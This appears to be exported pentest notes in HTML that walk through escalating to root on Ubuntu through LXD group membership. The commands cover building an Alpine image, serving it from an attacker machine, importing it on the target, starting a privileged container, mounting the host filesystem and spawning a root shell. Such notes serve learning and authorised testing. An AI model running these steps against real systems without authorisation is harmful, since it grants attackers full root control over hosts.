<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>LXC / LXD groups</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>LXC / LXD groups</h1><br/><br />LXD group is similar to Docker group and is the <span style="text-decoration:underline;">Ubuntu container manager</span>. <br />Upon installation, all users are added to the LXD group. <br />Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root. <br />Let&#39;s confirm group membership and use these rights to escalate to root.<br /><br />We can escalate the privileges if we are in the <strong><span style="color:#e01b24;">lxd group</span></strong><br />	<a href=""><img src="images/2625-1.png" alt="images/2625-1.png" /></a><br /><br /><strong>Download Alpine</strong> (<a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a>)<br />1. In the <span style="color:#e01b24;">Attacker Machine</span><br />	<div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>saghul<span style="color:#ff9d00;font-weight:700">/</span>lxd-alpine-builder<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>build-alpine</pre></div><br />	Execute build-alpine to build an Alpine-Linux image, it is the tar.gz file created<br />	<div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">sudo</span> .<span style="color:#ff9d00;font-weight:700">/</span>build-alpine</pre></div><br />		<a href=""><img src="images/2625-2.png" alt="images/2625-2.png" /></a><br />	<div class="codebox"><pre>python3 -m http.server</pre></div><br /><br />2. In the <span style="color:#3584e4;">Target Machine</span><br />   1) Download the builded Alpine inmage from the Attacker machine<br />	<a href=""><img src="images/2625-3.png" alt="images/2625-3.png" /></a><br />   2) Import the image<br />   	<div class="codebox"><pre>lxc image import alpine-v3.15-x86_64-20191008_1227.tar.gz --alias attackerImage</pre></div><br />    <div class="codebox"><pre>lxc image list</pre></div><br />	<a href=""><img src="images/2625-4.png" alt="images/2625-4.png" /></a><br />   3) Start a privileged container with the <code>security.privileged</code> set to <code>true</code> to run the container without a UID mapping<br />   	 This make the root user in the container the same as the root user on the host.<br />   	<div class="codebox"><pre>lxc init attackerImage rootAttacker -c security.privileged=<span style="color:#ff9d00;font-weight:700">true</span></pre></div><br />   	<a href=""><img src="images/2625-5.png" alt="images/2625-5.png" /></a><br />   4) Mount the host file system<br />   	<div class="codebox"><pre>lxc config device add rootAttacker mydev disk source=<span style="color:#ff9d00;font-weight:700">/</span> path=<span style="color:#ff9d00;font-weight:700">/</span>mnt<span style="color:#ff9d00;font-weight:700">/</span>root recursive=<span style="color:#ff9d00;font-weight:700">true</span></pre></div><br />  	<a href=""><img src="images/2625-6.png" alt="images/2625-6.png" /></a><br />   5) Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root.<br />   	  <div class="codebox"><pre>lxc start rootAttacker<br />lxc <span style="color:#ff9d00;font-weight:700">exec</span> rootAttacker <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span></pre></div><br />   		<a href=""><img src="images/2625-7.png" alt="images/2625-7.png" /></a><br /><br /></div>
</body>
</html>
